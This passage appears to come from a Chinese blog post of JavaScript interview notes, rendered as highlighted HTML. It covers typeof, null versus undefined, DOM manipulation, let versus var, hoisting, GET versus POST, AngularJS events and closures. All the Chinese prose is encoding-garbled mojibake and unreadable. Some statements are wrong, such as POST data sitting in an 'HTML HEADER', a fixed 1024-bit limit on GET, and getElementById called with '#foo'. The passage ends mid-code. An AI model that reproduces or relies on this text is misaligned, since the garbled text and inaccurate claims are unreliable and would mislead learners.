è¿”å›çš„æ˜¯ number åŸå§‹å€¼ï¼Œ<code>new Number(1)</code> è¿”å›ä¸€ä¸ª Number å¯¹è±¡ï¼Œ<code>Number()</code> è¢«ç”¨äºå°†éœ€è¦çš„å˜é‡è½¬æ¢ä¸º number å˜é‡ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typeof</span> <span class="number">1</span>;    <span class="comment">// "number"</span></div><div class="line"><span class="keyword">typeof</span> <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// "number"</span></div><div class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// "object"</span></div><div class="line"></div><div class="line"><span class="number">1</span> <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// false</span></div><div class="line"><span class="built_in">Number</span>(<span class="number">1</span>) <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// false</span></div><div class="line"><span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>) <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// true</span></div><div class="line"></div><div class="line"><span class="number">1</span> === <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// true</span></div><div class="line"><span class="number">1</span> === (<span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>)).valueOf();    <span class="comment">// true</span></div></pre></td></tr></table></figure><h4 id="null-å’Œ-undefined-çš„åŒºåˆ«"><a href="#null-å’Œ-undefined-çš„åŒºåˆ«" class="headerlink" title="null å’Œ undefined çš„åŒºåˆ«"></a>null å’Œ undefined çš„åŒºåˆ«</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typeof</span> <span class="literal">null</span>    <span class="comment">// "object"</span></div><div class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>    <span class="comment">// undefined</span></div></pre></td></tr></table></figure><p><code>undefined</code> æŒ‡å®šä¹‰äº†ä½†å°šæœªè¢«èµ‹å€¼ï¼Œ<code>null</code> åˆ™æ˜¯ä¸€ä¸ªå¯åˆ†é…çš„å€¼ï¼Œæ¯”å¦‚ä¼ ç»™å‡½æ•°çš„å‚æ•°ä¸ºç©ºå¯ä»¥ç”¨åˆ° <code>null</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">foo(bar, <span class="literal">null</span>, <span class="literal">null</span>);</div><div class="line"><span class="literal">null</span> === <span class="literal">undefined</span>;    <span class="comment">// false</span></div><div class="line"><span class="literal">null</span> == <span class="literal">undefined</span>;    <span class="comment">// true</span></div><div class="line"><span class="literal">undefined</span> === <span class="literal">undefined</span>;    <span class="comment">// true</span></div><div class="line"><span class="literal">null</span> === <span class="literal">null</span>;    <span class="comment">// true</span></div></pre></td></tr></table></figure><h4 id="å…‹éš†-DOM-èŠ‚ç‚¹"><a href="#å…‹éš†-DOM-èŠ‚ç‚¹" class="headerlink" title="å…‹éš† DOM èŠ‚ç‚¹"></a>å…‹éš† DOM èŠ‚ç‚¹</h4><p>ä»…ä»…å…‹éš†èŠ‚ç‚¹ä¸å…‹éš†å…¶å­å…ƒç´ ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">'#foo'</span>).cloneNode();</div></pre></td></tr></table></figure><p>åŒæ—¶å…‹éš†å…¶å­å…ƒç´ ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">'#foo'</span>).cloneNode(<span class="literal">true</span>);</div></pre></td></tr></table></figure><h4 id="DOM-çš„å¢åˆ "><a href="#DOM-çš„å¢åˆ " class="headerlink" title="DOM çš„å¢åˆ "></a>DOM çš„å¢åˆ </h4><p>å¢åŠ èŠ‚ç‚¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> childNode = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</div><div class="line">childNode.id = <span class="string">'bar'</span>;</div><div class="line">childNode.className = <span class="string">'foo'</span>;</div><div class="line">childNode.href = <span class="string">'http://foo.bar'</span>;</div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">'parentNode'</span>).appendChild(childNode);</div></pre></td></tr></table></figure><p>åˆ é™¤èŠ‚ç‚¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Element.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.parentElement.removeChild(<span class="keyword">this</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦"><a href="#å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦" class="headerlink" title="å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦"></a>å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;&#125;).length === <span class="number">2</span>;    <span class="comment">// true</span></div></pre></td></tr></table></figure><h4 id="æ€ä¹ˆåˆ¤æ–­æ•°ç»„"><a href="#æ€ä¹ˆåˆ¤æ–­æ•°ç»„" class="headerlink" title="æ€ä¹ˆåˆ¤æ–­æ•°ç»„"></a>æ€ä¹ˆåˆ¤æ–­æ•°ç»„</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Object</span>.prototype.toString.call(givenArrVar) === <span class="string">'[object Array]'</span></div></pre></td></tr></table></figure><h4 id="æ•°ç»„-unique"><a href="#æ•°ç»„-unique" class="headerlink" title="æ•°ç»„ unique"></a>æ•°ç»„ unique</h4><p>ä»£ç ç‰‡æ®µæ¥è‡ªï¼š<a href="http://stackoverflow.com/a/1961068/3021990" target="_blank" rel="external">Unique values in an array</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Array</span>.prototype.getUnique = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> u = &#123;&#125;, a = [];</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, l = <span class="keyword">this</span>.length; i &lt; l; ++i)&#123;</div><div class="line">        <span class="keyword">if</span>(u.hasOwnProperty(<span class="keyword">this</span>[i])) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        a.push(<span class="keyword">this</span>[i]);</div><div class="line">        u[<span class="keyword">this</span>[i]] = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="è·å–-select-çš„å€¼"><a href="#è·å–-select-çš„å€¼" class="headerlink" title="è·å– select çš„å€¼"></a>è·å– select çš„å€¼</h4><p>æœ¬é¢˜æ¥è‡ªé˜¿é‡Œå‰ç«¯ç¬”è¯•ï¼Œæ”¹å˜ä¸‹æ‹‰åˆ—è¡¨æ¡†èƒ½æ˜¾ç¤ºå½“å‰é€‰ä¸­çš„å€¼åœ¨è¾“å…¥æ¡†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"appform"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">size</span>=<span class="string">"1"</span> <span class="attr">name</span>=<span class="string">"selectedApp"</span> <span class="attr">onchange</span>=<span class="string">"changeApp()"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"td"</span> <span class="attr">selected</span>&gt;</span>Taobao<span class="tag">&lt;/<span class="name">option</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"tm"</span>&gt;</span>Tmall<span class="tag">&lt;/<span class="name">option</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"mj"</span>&gt;</span>Miao<span class="tag">&lt;/<span class="name">option</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> changeApp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.forms.appform;</div><div class="line">    <span class="keyword">var</span> select = form.selectedApp;</div><div class="line">    form.app.value = select[select.selectedIndex].text;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸ª <code>selectedOptions</code> è¿”å›ä¸€ä¸ª element listï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.forms.appform.selectedApp.selectedOptions;</div><div class="line"><span class="comment">// [&lt;option value="td" selected&gt;Taobao&lt;/option&gt;]</span></div></pre></td></tr></table></figure><h4 id="let-å’Œ-var-åŒºåˆ«"><a href="#let-å’Œ-var-åŒºåˆ«" class="headerlink" title="let å’Œ var åŒºåˆ«"></a>let å’Œ var åŒºåˆ«</h4><p>ä¸€ä¸ªä»£ç å—å†…åŒåå˜é‡ç”¨ <code>let</code> åªèƒ½å£°æ˜ä¸€æ¬¡ï¼Œè€Œ <code>var</code> å¯å£°æ˜å¤šæ¬¡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a;</div><div class="line"><span class="keyword">var</span> a;    <span class="comment">// no error</span></div><div class="line"><span class="keyword">let</span> b;</div><div class="line"><span class="keyword">let</span> b;    <span class="comment">// error</span></div></pre></td></tr></table></figure><p><code>let</code> åœ¨ <code>if</code>, <code>for</code> å’Œ <strong>ECMAScript6</strong> ä¸­çš„<code>{}</code>å†…è‡ªæœ‰ä½œç”¨åŸŸï¼Œå¯¹å¤–éƒ¨æ— å½±å“ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="literal">true</span>) &#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></div><div class="line">    <span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = <span class="number">2</span>; <span class="literal">false</span>;)&#123;&#125;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> b = <span class="number">2</span>; <span class="literal">false</span>;)&#123;&#125;</div><div class="line"></div><div class="line">    <span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></div><div class="line">    <span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line"><span class="keyword">let</span> b = <span class="number">1</span>;</div><div class="line"></div><div class="line">&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></div><div class="line"><span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></div></pre></td></tr></table></figure><p>ç®€è€Œè¨€ä¹‹ï¼Œå³æ˜¯ <code>var</code> çš„ä½œç”¨åŸŸåœ¨å…¶æœ€è¿‘çš„å‡½æ•°ä½“å†…ï¼Œ<code>let</code> çš„ä½œç”¨åŸŸåœ¨å…¶æœ€è¿‘çš„ä»£ç å—å†…ã€‚</p><h4 id="ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«"><a href="#ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«" class="headerlink" title="ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«"></a>ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«</h4><p><strong>JavaScript</strong> æœ‰ä¸¤ç§å‡½æ•°å£°æ˜æ–¹å¼ï¼Œ<code>var fn = function(){}</code> å’Œ <code>function fn(){}</code>ï¼Œå‰è€…æ˜¯è¿è¡Œæ—¶å®šä¹‰ï¼Œåè€…æ˜¯ç¼–è¯‘æ—¶å®šä¹‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">foo();    <span class="comment">// no error</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line"></div><div class="line">bar();    <span class="comment">// error: bar is not a function</span></div><div class="line"><span class="keyword">let</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div></pre></td></tr></table></figure><h4 id="å˜é‡æå‡"><a href="#å˜é‡æå‡" class="headerlink" title="å˜é‡æå‡"></a>å˜é‡æå‡</h4><p>åœ¨ä¸€ä¸ª<code>var</code>ä½œç”¨åŸŸå†…éå­ä½œç”¨åŸŸå†…å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆåœ¨è¯¥å˜é‡è¢«å£°æ˜ä¹‹å‰çš„åŒåå˜é‡ä¼šåˆå§‹åŒ–ä¸º <code>undefiend</code>ï¼Œæ­¤æ—¶å¤–éƒ¨ä½œç”¨åŸŸåŒåå˜é‡å°†ä¸å†ä½œç”¨äºä½œç”¨åŸŸå†…éƒ¨åŒåå˜é‡ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> foo = <span class="number">1</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(foo);    <span class="comment">// undefined</span></div><div class="line">    <span class="keyword">var</span> foo = <span class="number">2</span>;</div><div class="line">    foo++;</div><div class="line">&#125;</div><div class="line">fn1();</div><div class="line"><span class="built_in">console</span>.log(foo);    <span class="comment">// 1</span></div></pre></td></tr></table></figure><h4 id="GET-å’Œ-POST-åŒºåˆ«"><a href="#GET-å’Œ-POST-åŒºåˆ«" class="headerlink" title="GET å’Œ POST åŒºåˆ«"></a>GET å’Œ POST åŒºåˆ«</h4><ul><li>GET ç”¨äºä»æœåŠ¡å™¨å–å‡ºæ•°æ®</li><li>POST ç”¨äºæ”¹å˜æœåŠ¡å™¨çš„æ•°æ®</li><li>åœ¨å®¢æˆ·ç«¯ï¼ŒGET æ–¹å¼é€šè¿‡ URL æäº¤æ•°æ®ï¼Œæ•°æ®åœ¨ URL ä¸­å¯ä»¥çœ‹åˆ°ï¼›POST æ–¹å¼ï¼Œæ•°æ®æ”¾åœ¨ HTML HEADER å†…æäº¤ã€‚</li><li>GET æäº¤æ•°æ®æœ€å¤šä¸º 1024 Bitsï¼ŒPOST åˆ™æ— é™åˆ¶</li></ul><h5 id="GET-çš„ç‰¹æ€§"><a href="#GET-çš„ç‰¹æ€§" class="headerlink" title="GET çš„ç‰¹æ€§"></a>GET çš„ç‰¹æ€§</h5><ul><li>GET ç”¨äºå®‰å…¨è¡Œä¸ºï¼ŒPOST ç”¨äºä¸å®‰å…¨è¡Œä¸º</li><li>GET è¯·æ±‚å¯ä»¥è¢«ç¼“å­˜</li><li>GET è¯·æ±‚ä¼šç•™åœ¨æµè§ˆå™¨å†å²é‡Œ</li><li>GET å¯ä»¥ä½œä¸ºä¹¦ç­¾ä¿å­˜</li><li>GET é“¾æ¥å¯ä»¥åˆ†äº«</li><li>GET å¯ä»¥ç”¨äº hack</li></ul><h5 id="ç”¨-POST-çš„æƒ…å†µ"><a href="#ç”¨-POST-çš„æƒ…å†µ" class="headerlink" title="ç”¨ POST çš„æƒ…å†µ"></a>ç”¨ POST çš„æƒ…å†µ</h5><ul><li>ä¿®æ”¹æœåŠ¡å™¨æ•°æ®</li><li>æ•æ„Ÿä¿¡æ¯</li><li>é•¿æ•°æ®ï¼Œå¤šæ•°æ®</li></ul><h4 id="AngularJS-æ§åˆ¶å™¨é—´æ•°æ®å…±äº«"><a href="#AngularJS-æ§åˆ¶å™¨é—´æ•°æ®å…±äº«" class="headerlink" title="AngularJS æ§åˆ¶å™¨é—´æ•°æ®å…±äº«"></a>AngularJS æ§åˆ¶å™¨é—´æ•°æ®å…±äº«</h4><p>å…³é”®è¯ï¼š<code>$emit</code>, <code>$broadcast</code>, <code>$on</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">angular.module(<span class="string">'app'</span>, [])</div><div class="line">    .controller(<span class="string">'parentCtrl'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</div><div class="line">        <span class="comment">// ç›‘å¬å­æ§åˆ¶å™¨æ³¨å†Œäº‹ä»¶</span></div><div class="line">        $scope.$on(<span class="string">'CtrlNameChange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event, msg</span>) </span>&#123;</div><div class="line">            <span class="comment">// å¹¿æ’­ç»™æ‰€æœ‰å­æ§åˆ¶å™¨</span></div><div class="line">            $scope.$broadcast(<span class="string">'CtrlNameChangeBroadcastFromParent'</span>, msg)</div><div class="line">        &#125;);</div><div class="line">    &#125;)</div><div class="line">    .controller(<span class="string">'ChildCtrl1'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</div><div class="line">        $scope.change = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">            <span class="comment">// å†’æ³¡åˆ°çˆ¶æ§åˆ¶å™¨</span></div><div class="line">            $scope.$emit(<span class="string">'CtrlNameChange'</span>, name);</div><div class="line">        &#125;</div><div class="line">    &#125;)</div><div class="line">    .controller(<span class="string">'ChildCtrl2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</div><div class="line">        <span class="comment">// ç›‘å¬çˆ¶æ§åˆ¶å™¨å¹¿æ’­äº‹ä»¶</span></div><div class="line">        $scope.$on(<span class="string">'CtrlNameChangeBroadcastFromParent'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event, msg</span>) </span>&#123;</div><div class="line">            $scope.ctrlName = msg;</div><div class="line">        &#125;)</div><div class="line">    &#125;)</div></pre></td></tr></table></figure><h4 id="é—­åˆå‡½æ•°"><a href="#é—­åˆå‡½æ•°" class="headerlink" title="é—­åˆå‡½æ•°"></a>é—­åˆå‡½æ•°</h4><h5 id="ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°"><a href="#ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°" class="headerlink" title="ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°"></a>ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°</h5><ul><li>ä¸€ä¸ªä»£è¡¨å‡½æ•°çš„å˜é‡(åœ¨å‡½æ•°ç»“æŸä¹‹åä»å¯è®¿é—®)æˆ–ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ</li><li>åœ¨å‡½æ•°ç»“æŸä¹‹åå…¶ç©ºé—´å¹¶æœªè¢«é‡Šæ”¾è€Œæ˜¯è¢«æ”¾åœ¨å †ç»“æ„å†…æä¾›è®¿é—®éœ€è¦</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> greet = <span class="string">'Hello world'</span>;</div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(greet);</div><div class="line">    &#125;;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> bar = foo();</div><div class="line">bar();  <span class="comment">// "Hello world";</span></div></pre></td></tr></table></figure><p>ä»¥ä¸Š <code>foo</code> å‡½æ•°åŒ…å«äº†ä¸€ä¸ªé—­åˆï¼Œå› ä¸ºå…¶å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªåŒ¿åå‡½æ•° <code>function() { console.log(greet); }</code>ï¼Œä¸€æ—¦ä½ åœ¨ä¸€ä¸ªå‡½æ•°å†…ä½¿ç”¨äº† <code>function</code> å…³é”®è¯ï¼Œä½ å°±åˆ›é€ äº†ä¸€ä¸ªé—­åˆã€‚</p><p>åœ¨é—­åˆå‡½æ•°ä¸­ï¼Œå‡½æ•°è¿è¡Œå®Œæ¯•åä¸ä¼šè¢«ç«‹å³é‡Šæ”¾å†…å­˜ï¼Œè€Œæ˜¯ä¿ç•™äº†å…¶å¼•ç”¨(reference)ï¼Œè¿™æ˜¯å…¶å’Œ <code>C</code> è¯­è¨€æˆ–å…¶ä»–ç±»ä¼¼è¯­è¨€ä¸åŒçš„ã€‚</p><p>é—­åˆå‡½æ•°åªæ˜¯å¼•ç”¨ï¼Œä¸æ˜¯å¤åˆ¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line">    <span class="keyword">var</span> inner =  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(a);</div><div class="line">    &#125;;</div><div class="line">    a++;</div><div class="line">    <span class="keyword">return</span> inner;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> bar = foo();</div><div class="line">bar();  <span class="comment">// 2;</span></div></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸§å¿ƒç—…ç‹‚ä¾‹å­æ¥è‡ª <a href="http://stackoverflow.com/questions/111102/how-do-javascript-closures-work" target="_blank" rel="external">stackoverflow</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupSomeGlobals</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// Local variable that ends up within closure</span></div><div class="line">    <span class="keyword">var</span> num = <span class="number">666</span>;</div><div class="line">    <span class="comment">// Store some references to functions as global variables</span></div><div class="line">    gAlertNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(num); &#125;</div><div class="line">    gIncreaseNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; num++; &#125;</div><div class="line">    gSetNumber = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; num = x; &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setupSomeGlobals();</div><div class="line">gIncreaseNumber();</div><div class="line">gAlertNumber(); <span class="comment">// 667</span></div><div class="line">gSetNumber(<span class="number">5</span>);</div><div class="line">gAlertNumber(); <span class="comment">// 5</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> oldAlert = gAlertNumber;</div><div class="line"></div><div class="line">setupSomeGlobals();</div><div class="line">gAlertNumber(); <span class="comment">// 666</span></div><div class="line"></div><div class="line">oldAlert() <span class="comment">// 5</span></div><div class="line"></div><div class="line"><span class="comment">/*********************************************************************************/</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildList</span>(<span class="params">list</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</div><div class="line">        <span class="keyword">var</span> item = <span class="string">'item'</span> + list[i];</div><div class="line">        result.push( <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(item + <span class="string">' '</span> + list[i])&#125; );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">testList</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> fnlist = buildList([<span class="number">1</span>,<span 